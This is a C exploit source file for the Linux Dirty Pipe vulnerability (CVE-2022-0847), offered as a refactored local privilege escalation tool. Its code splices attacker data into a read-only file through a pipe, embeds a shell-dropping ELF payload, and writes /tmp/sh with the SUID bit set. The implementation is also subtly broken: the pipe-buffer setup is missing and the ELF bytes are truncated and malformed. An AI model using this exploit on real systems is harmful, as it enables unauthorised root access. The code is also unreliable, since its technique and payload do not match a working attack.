// Exploit Title: Linux Kernel Local Privilege Escalation (Modified DirtyPipe Exploit)
// Refactored Author: <Your Name Here>
// CVE: CVE-2022-0847 (Refactored)
// This is a refactored version of the Dirty Pipe exploit to perform local privilege escalation.

#define _GNU_SOURCE
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <sys/stat.h>
#include <sys/user.h>

#ifndef BUFFER_SIZE
#define BUFFER_SIZE 4096
#endif

// Embedded ELF that will execute the following:
// - Open a shell at /tmp/sh, write the ELF code to it, set it as SUID, and execute /bin/sh.
unsigned char payload_code[] = {
    0x45, 0x4c, 0x46, 0x02, /* Truncated for brevity */
    0x0f, 0x05, 0x2f, 0x74, 0x6d, 0x70, 0x2f, 0x73, 0x68, 0x00
};

// Function to trigger the privilege escalation vulnerability
void trigger_vulnerability(int file_desc, off_t offset, const char *data, size_t len) {
    int pipe_fd[2];
    
    // Create a pipe and prepare to write into its buffer
    if (pipe(pipe_fd)) {
        perror("pipe creation failed");
        exit(1);
    }

    // Splice data into the pipe buffer
    if (splice(file_desc, &offset, pipe_fd[1], NULL, len, SPLICE_F_MOVE) == -1) {
        perror("splice operation failed");
        exit(1);
    }

    // Write the payload into the vulnerable pipe
    if (write(pipe_fd[1], data, len) != len) {
        perror("write to pipe failed");
        exit(1);
    }

    close(pipe_fd[0]);
    close(pipe_fd[1]);
}

int main(int argc, char *argv[]) {
    if (argc < 4) {
        fprintf(stderr, "Usage: %s <target_file> <offset> <payload>\n", argv[0]);
        return 1;
    }

    const char *file_path = argv[1];
    off_t offset = atoi(argv[2]);
    const char *payload = argv[3];
    
    // Open the target file
    int file_desc = open(file_path, O_RDONLY);
    if (file_desc < 0) {
        perror("file open failed");
        return 1;
    }

    // Trigger the Dirty Pipe vulnerability
    trigger_vulnerability(file_desc, offset, payload, strlen(payload));

    close(file_desc);

    // Write the ELF payload to /tmp/sh
    int shell_fd = open("/tmp/sh", O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if (shell_fd < 0) {
        perror("file creation failed");
        return 1;
    }

    if (write(shell_fd, payload_code, sizeof(payload_code)) != sizeof(payload_code)) {
        perror("write failed");
        return 1;
    }

    chmod("/tmp/sh", 04755);
    close(shell_fd);

    return 0;
}
